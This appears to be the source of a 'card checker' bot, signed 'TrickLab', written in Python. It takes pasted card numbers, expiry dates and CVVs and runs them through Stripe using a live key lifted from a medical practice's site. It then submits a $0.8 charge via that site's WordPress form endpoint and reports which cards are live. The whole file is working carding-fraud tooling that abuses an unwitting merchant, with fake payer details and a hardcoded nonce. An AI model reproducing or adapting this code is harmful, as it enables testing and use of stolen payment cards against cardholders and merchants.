import aiohttp
import asyncio
import re

async def stripe_1d(message):
    text = message.strip()
    pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})' 
    match = re.search(pattern, text)

    if match:
        card_number = match.group(1)
        month = match.group(2)
        year = match.group(3)
        cvv = match.group(4)

        if len(year) == 2:
            year = "20" + year
        n = card_number
        cvc = cvv
        mm = month
        yy = year
        full_card = f"{n}|{mm}|{yy}|{cvc}"
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': 'N/A',  # Replace if necessary
            'muid': 'N/A', 
            'sid': 'N/A',   
            'payment_user_agent': 'stripe.js/v3',
            'key': 'pk_live_51M0JxcL2Uy4OBve275bqL0pSECJK5N0PiHvGEobqQhkTOe4vfWyGUJjYb8TG9ovdMp0eBXyRtI01GtieflayWIM700UKzWHybV',
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data) as stripe_response:
                    stripe_json = await stripe_response.json()  
                    payment_method_id = stripe_json.get('id')

                    if payment_method_id:
                        pass  
                    else:
                        return "Failed to retrieve Payment Method ID from Stripe. Please check the card details."
        except Exception as e:
            return f"Error processing Stripe request: {str(e)}"
                 
        headers = {
            'authority': 'moshermd.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://moshermd.com',
            'referer': 'https://moshermd.com/home/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            't': '1731383952837',
        }

        data = {
            'data': f'__fluent_form_embded_post_id=1318&_fluentform_3_fluentformnonce=5dd3652269&_wp_http_referer=%2Fhome%2F&names%5Bfirst_name%5D=Nicoc&names%5Blast_name%5D=Han&email=kka79877%40gmail.com&phone=9718085467&description=&custom-payment-amount=0.8&payment_method=stripe&__entry_intermediate_hash=f23abdcd518d1f307b3c25a09639cf08&__stripe_payment_method_id={payment_method_id}',
            'action': 'fluentform_submit',
            'form_id': '3',
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://moshermd.com/wp-admin/admin-ajax.php', params=params, headers=headers, data=data) as response:
                    r0 = await response.text()

                    if "Thank" in r0:
                        return f"""Stripe 1$        	
Card: `{full_card}`
Response: Payment Done🔥
Bot: TrickLab
                        """
                    elif "Authentication" in r0:
                        return f"""Stripe 1$        	
Card: `{full_card}`
Response: Authentication Failed❌
Bot: TrickLab
                        """
                    else:
                        response_json = await response.json()
                        response0 = response_json.get('errors', 'ERROR')
                        return f"""Stripe 1$
Card: `{full_card}`
{response0}❌
Bot: TrickLab
                        """
        except Exception as e:
            return f"Error processing final request: {str(e)}"
    else:
        return "Invalid card format. Please provide a valid card number, month, year, and cvv."
